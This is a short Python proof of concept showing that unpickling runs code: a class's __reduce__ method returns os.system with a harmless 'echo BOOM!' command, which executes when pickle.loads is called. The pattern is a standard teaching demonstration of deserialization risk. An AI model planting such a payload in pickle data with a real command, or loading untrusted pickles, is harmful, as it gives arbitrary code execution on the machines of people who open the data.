import pickle

class PickleBomb:
    def __reduce__(self):
        import os
        return (os.system,('echo BOOM!',))


bomb = PickleBomb()
pickled_b = pickle.dumps(bomb)

unpickle_b = pickle.loads(pickled_b)
